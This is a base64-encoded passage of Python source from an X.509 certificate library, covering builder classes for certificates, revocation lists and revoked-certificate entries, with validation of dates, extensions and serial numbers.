Xkgb25seSBiZSBzZXQgb25jZS4iKVxyXG4gICAgICAgIHRpbWUgPSBfY29udmVydF90b19uYWl2ZV91dGNfdGltZSh0aW1lKVxyXG4gICAgICAgIGlmIHRpbWUgPCBfRUFSTElFU1RfVVRDX1RJTUU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiVGhlIG5vdCB2YWxpZCBiZWZvcmUgZGF0ZSBtdXN0IGJlIG9uIG9yIGFmdGVyIlxyXG4gICAgICAgICAgICAgICAgIiAxOTUwIEphbnVhcnkgMSkuIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgaWYgc2VsZi5fbm90X3ZhbGlkX2FmdGVyIGlzIG5vdCBOb25lIGFuZCB0aW1lID4gc2VsZi5fbm90X3ZhbGlkX2FmdGVyOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlRoZSBub3QgdmFsaWQgYmVmb3JlIGRhdGUgbXVzdCBiZSBiZWZvcmUgdGhlIG5vdCB2YWxpZCBhZnRlciAiXHJcbiAgICAgICAgICAgICAgICAiZGF0ZS4iXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICByZXR1cm4gQ2VydGlmaWNhdGVCdWlsZGVyKFxyXG4gICAgICAgICAgICBzZWxmLl9pc3N1ZXJfbmFtZSxcclxuICAgICAgICAgICAgc2VsZi5fc3ViamVjdF9uYW1lLFxyXG4gICAgICAgICAgICBzZWxmLl9wdWJsaWNfa2V5LFxyXG4gICAgICAgICAgICBzZWxmLl9zZXJpYWxfbnVtYmVyLFxyXG4gICAgICAgICAgICB0aW1lLFxyXG4gICAgICAgICAgICBzZWxmLl9ub3RfdmFsaWRfYWZ0ZXIsXHJcbiAgICAgICAgICAgIHNlbGYuX2V4dGVuc2lvbnMsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBub3RfdmFsaWRfYWZ0ZXIoc2VsZiwgdGltZTogZGF0ZXRpbWUuZGF0ZXRpbWUpIC0+ICJDZXJ0aWZpY2F0ZUJ1aWxkZXIiOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFNldHMgdGhlIGNlcnRpZmljYXRlIGV4cGlyYXRpb24gdGltZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh0aW1lLCBkYXRldGltZS5kYXRldGltZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiRXhwZWN0aW5nIGRhdGV0aW1lIG9iamVjdC4iKVxyXG4gICAgICAgIGlmIHNlbGYuX25vdF92YWxpZF9hZnRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVGhlIG5vdCB2YWxpZCBhZnRlciBtYXkgb25seSBiZSBzZXQgb25jZS4iKVxyXG4gICAgICAgIHRpbWUgPSBfY29udmVydF90b19uYWl2ZV91dGNfdGltZSh0aW1lKVxyXG4gICAgICAgIGlmIHRpbWUgPCBfRUFSTElFU1RfVVRDX1RJTUU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiVGhlIG5vdCB2YWxpZCBhZnRlciBkYXRlIG11c3QgYmUgb24gb3IgYWZ0ZXIiXHJcbiAgICAgICAgICAgICAgICAiIDE5NTAgSmFudWFyeSAxLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGlmIChcclxuICAgICAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2JlZm9yZSBpcyBub3QgTm9uZVxyXG4gICAgICAgICAgICBhbmQgdGltZSA8IHNlbGYuX25vdF92YWxpZF9iZWZvcmVcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlRoZSBub3QgdmFsaWQgYWZ0ZXIgZGF0ZSBtdXN0IGJlIGFmdGVyIHRoZSBub3QgdmFsaWQgYmVmb3JlICJcclxuICAgICAgICAgICAgICAgICJkYXRlLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBDZXJ0aWZpY2F0ZUJ1aWxkZXIoXHJcbiAgICAgICAgICAgIHNlbGYuX2lzc3Vlcl9uYW1lLFxyXG4gICAgICAgICAgICBzZWxmLl9zdWJqZWN0X25hbWUsXHJcbiAgICAgICAgICAgIHNlbGYuX3B1YmxpY19rZXksXHJcbiAgICAgICAgICAgIHNlbGYuX3NlcmlhbF9udW1iZXIsXHJcbiAgICAgICAgICAgIHNlbGYuX25vdF92YWxpZF9iZWZvcmUsXHJcbiAgICAgICAgICAgIHRpbWUsXHJcbiAgICAgICAgICAgIHNlbGYuX2V4dGVuc2lvbnMsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBhZGRfZXh0ZW5zaW9uKFxyXG4gICAgICAgIHNlbGYsIGV4dHZhbDogRXh0ZW5zaW9uVHlwZSwgY3JpdGljYWw6IGJvb2xcclxuICAgICkgLT4gIkNlcnRpZmljYXRlQnVpbGRlciI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQWRkcyBhbiBYLjUwOSBleHRlbnNpb24gdG8gdGhlIGNlcnRpZmljYXRlLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGV4dHZhbCwgRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiZXh0ZW5zaW9uIG11c3QgYmUgYW4gRXh0ZW5zaW9uVHlwZSIpXHJcblxyXG4gICAgICAgIGV4dGVuc2lvbiA9IEV4dGVuc2lvbihleHR2YWwub2lkLCBjcml0aWNhbCwgZXh0dmFsKVxyXG4gICAgICAgIF9yZWplY3RfZHVwbGljYXRlX2V4dGVuc2lvbihleHRlbnNpb24sIHNlbGYuX2V4dGVuc2lvbnMpXHJcblxyXG4gICAgICAgIHJldHVybiBDZXJ0aWZpY2F0ZUJ1aWxkZXIoXHJcbiAgICAgICAgICAgIHNlbGYuX2lzc3Vlcl9uYW1lLFxyXG4gICAgICAgICAgICBzZWxmLl9zdWJqZWN0X25hbWUsXHJcbiAgICAgICAgICAgIHNlbGYuX3B1YmxpY19rZXksXHJcbiAgICAgICAgICAgIHNlbGYuX3NlcmlhbF9udW1iZXIsXHJcbiAgICAgICAgICAgIHNlbGYuX25vdF92YWxpZF9iZWZvcmUsXHJcbiAgICAgICAgICAgIHNlbGYuX25vdF92YWxpZF9hZnRlcixcclxuICAgICAgICAgICAgc2VsZi5fZXh0ZW5zaW9ucyArIFtleHRlbnNpb25dLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgc2lnbihcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHByaXZhdGVfa2V5OiBDRVJUSUZJQ0FURV9QUklWQVRFX0tFWV9UWVBFUyxcclxuICAgICAgICBhbGdvcml0aG06IHR5cGluZy5PcHRpb25hbFtoYXNoZXMuSGFzaEFsZ29yaXRobV0sXHJcbiAgICAgICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbiAgICApIC0+IENlcnRpZmljYXRlOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFNpZ25zIHRoZSBjZXJ0aWZpY2F0ZSB1c2luZyB0aGUgQ0FcJ3MgcHJpdmF0ZSBrZXkuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fc3ViamVjdF9uYW1lIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkEgY2VydGlmaWNhdGUgbXVzdCBoYXZlIGEgc3ViamVjdCBuYW1lIilcclxuXHJcbiAgICAgICAgaWYgc2VsZi5faXNzdWVyX25hbWUgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQSBjZXJ0aWZpY2F0ZSBtdXN0IGhhdmUgYW4gaXNzdWVyIG5hbWUiKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9zZXJpYWxfbnVtYmVyIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkEgY2VydGlmaWNhdGUgbXVzdCBoYXZlIGEgc2VyaWFsIG51bWJlciIpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX25vdF92YWxpZF9iZWZvcmUgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQSBjZXJ0aWZpY2F0ZSBtdXN0IGhhdmUgYSBub3QgdmFsaWQgYmVmb3JlIHRpbWUiKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9ub3RfdmFsaWRfYWZ0ZXIgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQSBjZXJ0aWZpY2F0ZSBtdXN0IGhhdmUgYSBub3QgdmFsaWQgYWZ0ZXIgdGltZSIpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX3B1YmxpY19rZXkgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQSBjZXJ0aWZpY2F0ZSBtdXN0IGhhdmUgYSBwdWJsaWMga2V5IilcclxuXHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5jcmVhdGVfeDUwOV9jZXJ0aWZpY2F0ZShzZWxmLCBwcml2YXRlX2tleSwgYWxnb3JpdGhtKVxyXG5cclxuXHJcbmNsYXNzIENlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3RCdWlsZGVyOlxyXG4gICAgX2V4dGVuc2lvbnM6IHR5cGluZy5MaXN0W0V4dGVuc2lvbltFeHRlbnNpb25UeXBlXV1cclxuICAgIF9yZXZva2VkX2NlcnRpZmljYXRlczogdHlwaW5nLkxpc3RbUmV2b2tlZENlcnRpZmljYXRlXVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGlzc3Vlcl9uYW1lOiB0eXBpbmcuT3B0aW9uYWxbTmFtZV0gPSBOb25lLFxyXG4gICAgICAgIGxhc3RfdXBkYXRlOiB0eXBpbmcuT3B0aW9uYWxbZGF0ZXRpbWUuZGF0ZXRpbWVdID0gTm9uZSxcclxuICAgICAgICBuZXh0X3VwZGF0ZTogdHlwaW5nLk9wdGlvbmFsW2RhdGV0aW1lLmRhdGV0aW1lXSA9IE5vbmUsXHJcbiAgICAgICAgZXh0ZW5zaW9uczogdHlwaW5nLkxpc3RbRXh0ZW5zaW9uW0V4dGVuc2lvblR5cGVdXSA9IFtdLFxyXG4gICAgICAgIHJldm9rZWRfY2VydGlmaWNhdGVzOiB0eXBpbmcuTGlzdFtSZXZva2VkQ2VydGlmaWNhdGVdID0gW10sXHJcbiAgICApOlxyXG4gICAgICAgIHNlbGYuX2lzc3Vlcl9uYW1lID0gaXNzdWVyX25hbWVcclxuICAgICAgICBzZWxmLl9sYXN0X3VwZGF0ZSA9IGxhc3RfdXBkYXRlXHJcbiAgICAgICAgc2VsZi5fbmV4dF91cGRhdGUgPSBuZXh0X3VwZGF0ZVxyXG4gICAgICAgIHNlbGYuX2V4dGVuc2lvbnMgPSBleHRlbnNpb25zXHJcbiAgICAgICAgc2VsZi5fcmV2b2tlZF9jZXJ0aWZpY2F0ZXMgPSByZXZva2VkX2NlcnRpZmljYXRlc1xyXG5cclxuICAgIGRlZiBpc3N1ZXJfbmFtZShcclxuICAgICAgICBzZWxmLCBpc3N1ZXJfbmFtZTogTmFtZVxyXG4gICAgKSAtPiAiQ2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdEJ1aWxkZXIiOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGlzc3Vlcl9uYW1lLCBOYW1lKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJFeHBlY3RpbmcgeDUwOS5OYW1lIG9iamVjdC4iKVxyXG4gICAgICAgIGlmIHNlbGYuX2lzc3Vlcl9uYW1lIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJUaGUgaXNzdWVyIG5hbWUgbWF5IG9ubHkgYmUgc2V0IG9uY2UuIilcclxuICAgICAgICByZXR1cm4gQ2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdEJ1aWxkZXIoXHJcbiAgICAgICAgICAgIGlzc3Vlcl9uYW1lLFxyXG4gICAgICAgICAgICBzZWxmLl9sYXN0X3VwZGF0ZSxcclxuICAgICAgICAgICAgc2VsZi5fbmV4dF91cGRhdGUsXHJcbiAgICAgICAgICAgIHNlbGYuX2V4dGVuc2lvbnMsXHJcbiAgICAgICAgICAgIHNlbGYuX3Jldm9rZWRfY2VydGlmaWNhdGVzLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgbGFzdF91cGRhdGUoXHJcbiAgICAgICAgc2VsZiwgbGFzdF91cGRhdGU6IGRhdGV0aW1lLmRhdGV0aW1lXHJcbiAgICApIC0+ICJDZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0QnVpbGRlciI6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UobGFzdF91cGRhdGUsIGRhdGV0aW1lLmRhdGV0aW1lKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJFeHBlY3RpbmcgZGF0ZXRpbWUgb2JqZWN0LiIpXHJcbiAgICAgICAgaWYgc2VsZi5fbGFzdF91cGRhdGUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkxhc3QgdXBkYXRlIG1heSBvbmx5IGJlIHNldCBvbmNlLiIpXHJcbiAgICAgICAgbGFzdF91cGRhdGUgPSBfY29udmVydF90b19uYWl2ZV91dGNfdGltZShsYXN0X3VwZGF0ZSlcclxuICAgICAgICBpZiBsYXN0X3VwZGF0ZSA8IF9FQVJMSUVTVF9VVENfVElNRTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJUaGUgbGFzdCB1cGRhdGUgZGF0ZSBtdXN0IGJlIG9uIG9yIGFmdGVyIiAiIDE5NTAgSmFudWFyeSAxLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGlmIHNlbGYuX25leHRfdXBkYXRlIGlzIG5vdCBOb25lIGFuZCBsYXN0X3VwZGF0ZSA+IHNlbGYuX25leHRfdXBkYXRlOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlRoZSBsYXN0IHVwZGF0ZSBkYXRlIG11c3QgYmUgYmVmb3JlIHRoZSBuZXh0IHVwZGF0ZSBkYXRlLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBDZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0QnVpbGRlcihcclxuICAgICAgICAgICAgc2VsZi5faXNzdWVyX25hbWUsXHJcbiAgICAgICAgICAgIGxhc3RfdXBkYXRlLFxyXG4gICAgICAgICAgICBzZWxmLl9uZXh0X3VwZGF0ZSxcclxuICAgICAgICAgICAgc2VsZi5fZXh0ZW5zaW9ucyxcclxuICAgICAgICAgICAgc2VsZi5fcmV2b2tlZF9jZXJ0aWZpY2F0ZXMsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBuZXh0X3VwZGF0ZShcclxuICAgICAgICBzZWxmLCBuZXh0X3VwZGF0ZTogZGF0ZXRpbWUuZGF0ZXRpbWVcclxuICAgICkgLT4gIkNlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3RCdWlsZGVyIjpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShuZXh0X3VwZGF0ZSwgZGF0ZXRpbWUuZGF0ZXRpbWUpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkV4cGVjdGluZyBkYXRldGltZSBvYmplY3QuIilcclxuICAgICAgICBpZiBzZWxmLl9uZXh0X3VwZGF0ZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTGFzdCB1cGRhdGUgbWF5IG9ubHkgYmUgc2V0IG9uY2UuIilcclxuICAgICAgICBuZXh0X3VwZGF0ZSA9IF9jb252ZXJ0X3RvX25haXZlX3V0Y190aW1lKG5leHRfdXBkYXRlKVxyXG4gICAgICAgIGlmIG5leHRfdXBkYXRlIDwgX0VBUkxJRVNUX1VUQ19USU1FOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlRoZSBsYXN0IHVwZGF0ZSBkYXRlIG11c3QgYmUgb24gb3IgYWZ0ZXIiICIgMTk1MCBKYW51YXJ5IDEuIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgaWYgc2VsZi5fbGFzdF91cGRhdGUgaXMgbm90IE5vbmUgYW5kIG5leHRfdXBkYXRlIDwgc2VsZi5fbGFzdF91cGRhdGU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiVGhlIG5leHQgdXBkYXRlIGRhdGUgbXVzdCBiZSBhZnRlciB0aGUgbGFzdCB1cGRhdGUgZGF0ZS4iXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICByZXR1cm4gQ2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdEJ1aWxkZXIoXHJcbiAgICAgICAgICAgIHNlbGYuX2lzc3Vlcl9uYW1lLFxyXG4gICAgICAgICAgICBzZWxmLl9sYXN0X3VwZGF0ZSxcclxuICAgICAgICAgICAgbmV4dF91cGRhdGUsXHJcbiAgICAgICAgICAgIHNlbGYuX2V4dGVuc2lvbnMsXHJcbiAgICAgICAgICAgIHNlbGYuX3Jldm9rZWRfY2VydGlmaWNhdGVzLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgYWRkX2V4dGVuc2lvbihcclxuICAgICAgICBzZWxmLCBleHR2YWw6IEV4dGVuc2lvblR5cGUsIGNyaXRpY2FsOiBib29sXHJcbiAgICApIC0+ICJDZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0QnVpbGRlciI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQWRkcyBhbiBYLjUwOSBleHRlbnNpb24gdG8gdGhlIGNlcnRpZmljYXRlIHJldm9jYXRpb24gbGlzdC5cclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShleHR2YWwsIEV4dGVuc2lvblR5cGUpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImV4dGVuc2lvbiBtdXN0IGJlIGFuIEV4dGVuc2lvblR5cGUiKVxyXG5cclxuICAgICAgICBleHRlbnNpb24gPSBFeHRlbnNpb24oZXh0dmFsLm9pZCwgY3JpdGljYWwsIGV4dHZhbClcclxuICAgICAgICBfcmVqZWN0X2R1cGxpY2F0ZV9leHRlbnNpb24oZXh0ZW5zaW9uLCBzZWxmLl9leHRlbnNpb25zKVxyXG4gICAgICAgIHJldHVybiBDZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0QnVpbGRlcihcclxuICAgICAgICAgICAgc2VsZi5faXNzdWVyX25hbWUsXHJcbiAgICAgICAgICAgIHNlbGYuX2xhc3RfdXBkYXRlLFxyXG4gICAgICAgICAgICBzZWxmLl9uZXh0X3VwZGF0ZSxcclxuICAgICAgICAgICAgc2VsZi5fZXh0ZW5zaW9ucyArIFtleHRlbnNpb25dLFxyXG4gICAgICAgICAgICBzZWxmLl9yZXZva2VkX2NlcnRpZmljYXRlcyxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIGFkZF9yZXZva2VkX2NlcnRpZmljYXRlKFxyXG4gICAgICAgIHNlbGYsIHJldm9rZWRfY2VydGlmaWNhdGU6IFJldm9rZWRDZXJ0aWZpY2F0ZVxyXG4gICAgKSAtPiAiQ2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdEJ1aWxkZXIiOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEFkZHMgYSByZXZva2VkIGNlcnRpZmljYXRlIHRvIHRoZSBDUkwuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocmV2b2tlZF9jZXJ0aWZpY2F0ZSwgUmV2b2tlZENlcnRpZmljYXRlKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJNdXN0IGJlIGFuIGluc3RhbmNlIG9mIFJldm9rZWRDZXJ0aWZpY2F0ZSIpXHJcblxyXG4gICAgICAgIHJldHVybiBDZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0QnVpbGRlcihcclxuICAgICAgICAgICAgc2VsZi5faXNzdWVyX25hbWUsXHJcbiAgICAgICAgICAgIHNlbGYuX2xhc3RfdXBkYXRlLFxyXG4gICAgICAgICAgICBzZWxmLl9uZXh0X3VwZGF0ZSxcclxuICAgICAgICAgICAgc2VsZi5fZXh0ZW5zaW9ucyxcclxuICAgICAgICAgICAgc2VsZi5fcmV2b2tlZF9jZXJ0aWZpY2F0ZXMgKyBbcmV2b2tlZF9jZXJ0aWZpY2F0ZV0sXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBzaWduKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgcHJpdmF0ZV9rZXk6IENFUlRJRklDQVRFX1BSSVZBVEVfS0VZX1RZUEVTLFxyXG4gICAgICAgIGFsZ29yaXRobTogdHlwaW5nLk9wdGlvbmFsW2hhc2hlcy5IYXNoQWxnb3JpdGhtXSxcclxuICAgICAgICBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZSxcclxuICAgICkgLT4gQ2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdDpcclxuICAgICAgICBpZiBzZWxmLl9pc3N1ZXJfbmFtZSBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJBIENSTCBtdXN0IGhhdmUgYW4gaXNzdWVyIG5hbWUiKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9sYXN0X3VwZGF0ZSBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJBIENSTCBtdXN0IGhhdmUgYSBsYXN0IHVwZGF0ZSB0aW1lIilcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fbmV4dF91cGRhdGUgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQSBDUkwgbXVzdCBoYXZlIGEgbmV4dCB1cGRhdGUgdGltZSIpXHJcblxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuY3JlYXRlX3g1MDlfY3JsKHNlbGYsIHByaXZhdGVfa2V5LCBhbGdvcml0aG0pXHJcblxyXG5cclxuY2xhc3MgUmV2b2tlZENlcnRpZmljYXRlQnVpbGRlcjpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHNlcmlhbF9udW1iZXI6IHR5cGluZy5PcHRpb25hbFtpbnRdID0gTm9uZSxcclxuICAgICAgICByZXZvY2F0aW9uX2RhdGU6IHR5cGluZy5PcHRpb25hbFtkYXRldGltZS5kYXRldGltZV0gPSBOb25lLFxyXG4gICAgICAgIGV4dGVuc2lvbnM6IHR5cGluZy5MaXN0W0V4dGVuc2lvbltFeHRlbnNpb25UeXBlXV0gPSBbXSxcclxuICAgICk6XHJcbiAgICAgICAgc2VsZi5fc2VyaWFsX251bWJlciA9IHNlcmlhbF9udW1iZXJcclxuICAgICAgICBzZWxmLl9yZXZvY2F0aW9uX2RhdGUgPSByZXZvY2F0aW9uX2RhdGVcclxuICAgICAgICBzZWxmLl9leHRlbnNpb25zID0gZXh0ZW5zaW9uc1xyXG5cclxuICAgIGRlZiBzZXJpYWxfbnVtYmVyKHNlbGYsIG51bWJlcjogaW50KSAtPiAiUmV2b2tlZENlcnRpZmljYXRlQnVpbGRlciI6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UobnVtYmVyLCBpbnQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIlNlcmlhbCBudW1iZXIgbXVzdCBiZSBvZiBpbnRlZ3JhbCB0eXBlLiIpXHJcbiAgICAgICAgaWYgc2VsZi5fc2VyaWFsX251bWJlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVGhlIHNlcmlhbCBudW1iZXIgbWF5IG9ubHkgYmUgc2V0IG9uY2UuIilcclxuICAgICAgICBpZiBudW1iZXIgPD0gMDpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVGhlIHNlcmlhbCBudW1iZXIgc2hvdWxkIGJlIHBvc2l0aXZlIilcclxuXHJcbiAgICAgICAgIyBBU04uMSBpbnRlZ2VycyBhcmUgYWx3YXlzIHNpZ25lZCwgc28gbW9zdCBzaWduaWZpY2FudCBiaXQgbXVzdCBiZVxyXG4gICAgICAgICMgemVyby5cclxuICAgICAgICBpZiBudW1iZXIuYml0X2xlbmd0aCgpID49IDE2MDogICMgQXMgZGVmaW5lZCBpbiBSRkMgNTI4MFxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlRoZSBzZXJpYWwgbnVtYmVyIHNob3VsZCBub3QgYmUgbW9yZSB0aGFuIDE1OSAiICJiaXRzLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBSZXZva2VkQ2VydGlmaWNhdGVCdWlsZGVyKFxyXG4gICAgICAgICAgICBudW1iZXIsIHNlbGYuX3Jldm9jYXRpb25fZGF0ZSwgc2VsZi5fZXh0ZW5zaW9uc1xyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgcmV2b2NhdGlvbl9kYXRlKFxyXG4gICAgICAgIHNlbGYsIHRpbWU6IGRhdGV0aW1lLmRhdGV0aW1lXHJcbiAgICApIC0+ICJSZXZva2VkQ2VydGlmaWNhdGVCdWlsZGVyIjpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh0aW1lLCBkYXRldGltZS5kYXRldGltZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiRXhwZWN0aW5nIGRhdGV0aW1lIG9iamVjdC4iKVxyXG4gICAgICAgIGlmIHNlbGYuX3Jldm9jYXRpb25fZGF0ZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVGhlIHJldm9jYXRpb24gZGF0ZSBtYXkgb25seSBiZSBzZXQgb25jZS4iKVxyXG4gICAgICAgIHRpbWUgPSBfY29udmVydF90b19uYWl2ZV91dGNfdGltZSh0aW1lKVxyXG4gICAgICAgIGlmIHRpbWUgPCBfRUFSTElFU1RfVVRDX1RJTUU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiVGhlIHJldm9jYXRpb24gZGF0ZSBtdXN0IGJlIG9uIG9yIGFmdGVyIiAiIDE5NTAgSmFudWFyeSAxLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBSZXZva2VkQ2VydGlmaWNhdGVCdWlsZGVyKFxyXG4gICAgICAgICAgICBzZWxmLl9zZXJpYWxfbnVtYmVyLCB0aW1lLCBzZWxmLl9leHRlbnNpb25zXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBhZGRfZXh0ZW5zaW9uKFxyXG4gICAgICAgIHNlbGYsIGV4dHZhbDogRXh0ZW5zaW9uVHlwZSwgY3JpdGljYWw6IGJvb2xcclxuICAgICkgLT4gIlJldm9rZWRDZXJ0aWZpY2F0ZUJ1aWxkZXIiOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGV4dHZhbCwgRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiZXh0ZW5zaW9uIG11c3QgYmUgYW4gRXh0ZW5zaW9uVHlwZSIpXHJcblxyXG4gICAgICAgIGV4dGVuc2lvbiA9IEV4dGVuc2lvbihleHR2YWwub2lkLCBjcml0aWNhbCwgZXh0dmFsKVxyXG4gICAgICAgIF9yZWplY3RfZHVwbGljYXRlX2V4dGVuc2lvbihleHRlbnNpb24sIHNlbGYuX2V4dGVuc2lvbnMpXHJcbiAgICAgICAgcmV0dXJuIFJldm9rZWRDZXJ0aWZpY2F0ZUJ1aWxkZXIoXHJcbiAgICAgICAgICAgIHNlbGYuX3NlcmlhbF9udW1iZXIsXHJcbiAgICAgICAgICAgIHNlbGYuX3Jldm9jYXRpb25fZGF0ZSxcclxuICAgICAgICAgICAgc2VsZi5fZXh0ZW5zaW9ucyArIFtleHRlbnNpb25dLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgYnVpbGQoc2VsZiwgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUpIC0+IFJldm9rZWRDZXJ0aWZpY2F0ZTpcclxuICAgICAgICBpZiBzZWxmLl9zZXJpYWxfbnVtYmVyIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkEgcmV2b2tlZCBjZXJ0aWZpY2F0ZSBtdXN0IGhhdmUgYSBzZXJpYWwgbnVtYmV